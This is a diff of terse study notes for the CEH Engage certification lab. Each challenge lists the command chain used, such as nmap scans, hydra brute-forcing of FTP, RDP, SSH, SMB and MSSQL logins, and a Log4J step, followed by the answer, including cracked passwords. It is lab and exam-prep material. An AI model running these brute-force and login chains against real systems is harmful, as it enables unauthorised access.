@@ -21,7 +21,7 @@ CEH Engage - Part I
 
 CEH Engage - Part II
 
-- C1 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P Desktop/password.txt ftp://192.168.10.111): https://www.crushftp.com/
+- C1 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P rockyou.txt ftp://192.168.10.111): https://www.crushftp.com/
 - C2 (wireshark filter - http.request.method == POST -> login attempts): kety/apple
 - C3
 - C4 (wireshark filter udp): 192.168.10.144
@@ -29,7 +29,7 @@ CEH Engage - Part II
 - C6 (most income bytes from remote ip): 192.168.10.222
 - C7
 - C8 (nmap -sn 192.168.10.0/24 -> nmap --script ms-sql* 192.168.10.144 -> hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql -> mysqlclient.py Server_mssrv:Spidy@192.168.10.144 -> dir C:\Users\Public\Downloads\MSS.txt): 7
-- C9 (nmap -p 3389 -sV --open 192.168.10.0/24 -> hydra -l "Maurice" -P rockyou.txt rdp://192.168.10.222): Pumpkin@1234
+- C9 (nmap -p 3389 -sV --open 192.168.10.0/24 -> hydra -l Maurice -P rockyou.txt rdp://192.168.10.222): Pumpkin@1234
 - C10 (hybrid-analysis.com -> SHA-256):  d282
 - C11 (Share in Win -> Process Monitor Microsoft Sysinternals -> Open logfile and Find H3ll0.exe -> Process -> Parent ID): 6952
 - C12
@@ -46,12 +46,12 @@ CEH Engage - Part II
 - C2 (wireshark filter - http.request.method == POST -> login attempts): lee/test
 - C3 (Open cowrie.log): 172.30.10.99
 - C4 (nmap --script http-headers www.certifiedhacker.com)
-- C5 (nmap -p 22 --open 192.168.10.0/24 -> hydra -l "Martin" -P rockyou.txt ssh://192.168.10.101 -> ssh Martin@192.168.10.101 -> type Desktop\$ollers.txt): i2tr&^72546HJ*
-- C6
-- C7
-- C8
-- C9
-- C10
+- C5 (nmap -p 22 --open 192.168.10.0/24 -> hydra -l Martin -P rockyou.txt ssh://192.168.10.101 -> ssh Martin@192.168.10.101 -> type Desktop\$ollers.txt): i2tr&^72546HJ*
+- C6 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P rockyou.txt ftp://192.168.10.111 -> ftp 192.168.10.111 -> cd Desktop -> get w_domain.txt -> cat w_domain.txt): 7867721010
+- C7 (nmap -p 8080 -sVC --open 172.30.10.0/24 -> Log4J): Ch@mp2022
+- C8 (nmap -p 139,445 192.168.10.101 -> hydra -L users.txt -P rockyou.txt 192.168.10.101 smb -> smbclient -L //192.168.10.101 -U Martin -> smbclient //192.168.10.101/Users -U Martin -> ls -> Mount smb share locally and find file -> cd Martin\Music\ -> get webpent.txt -> Open webpent.txt -> curl -sL www.moviescope.com): EC-Council
+- C9 (chatgpt): cross-site scripting (XSS)
+- C10 (chatgpt): Content Security Policy
 - C11
 - C12
 - C13
